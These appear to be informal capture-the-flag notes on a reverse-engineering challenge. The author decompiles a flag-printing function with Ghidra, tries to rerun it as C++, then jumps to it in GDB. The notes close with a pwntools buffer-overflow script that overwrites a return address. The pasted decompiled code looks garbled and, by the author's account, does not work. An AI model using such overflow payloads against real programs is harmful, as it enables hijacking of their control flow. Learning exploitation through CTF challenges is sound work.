I probably want to use a tool to continuously supply larger and larger strings

GDB isn't helping this time... so lets kick it up a notch with ghidra

and you can see how

meaning... I might just get away with copy pasting the function...

apparently `byte` is `unsigned char` (replace all instances)

huh (C++)

that's weird

![[Pasted image 20211231214341.png]]
running it in c
didn't work

```cpp
#include <iostream>

using namespace std;

void printFlag(void)

{
  unsigned char bVar1;
  unsigned char bVar2;
  char local_2b[26];
  char local_11;
  int local_10;

  local_2b[0] = ']';
  local_2b[1] = 0x97;
  local_2b[2] = 0xee;
  local_2b[3] = 0xf5;
  local_2b[4] = 0x20;
  local_2b[5] = 0xfa;
  local_2b[6] = 0x81;
  local_2b[7] = 0x31;
  local_2b[8] = 0xf8;
  local_2b[9] = 0x61;
  local_2b[10] = 0x4c;
  local_2b[11] = 0x60;
  local_2b[12] = 0x4c;
  local_2b[13] = 0xd2;
  local_2b[14] = 0xfe;
  local_2b[15] = 0x93;

  local_10 = 0;
  while (local_10 < 0x1a) {
    bVar2 = (unsigned char)local_10;
    bVar1 = bVar2 - (local_2b[local_10] + 0xaaU ^ 0xfc);
    bVar1 = -bVar2 - (-bVar2 - (bVar1 * '\b' | bVar1 >> 5)) ^ bVar2;
    bVar1 =
        ~(((0x2e - ~(~-(~((~((~-~(0x15 -

                          bVar2) +
                        bVar2) +
                     bVar2) ^
            0xac) +
               0x31 ^
           0x12) +
              0x8e ^
          bVar2);
    local_11 = -(-0x50 - ((bVar1 << 3 | bVar1 >> 5) + 0x60));
    local_2b[local_10] = local_11;
    local_10 = local_10 + 1;
  }
  cout << local_2b;
  return;
}

int main() { printFlag(); }
```

ran it locally on my own computer...
(looking back, this is totally not how to solve this stuff lol)

darn

After some research, I found that I can jump addresses with GDB
![[Pasted image 20211231221205.png]]

YEHH

thanks GDB

I was supposed to buffer overflow like this: (code was totally not copy pasted)

```python
import pwn

io = pwn.process("./program-x86")
io.send(b"A" * 156 + pwn.p32(0x80484b1))

io.interactive()
```
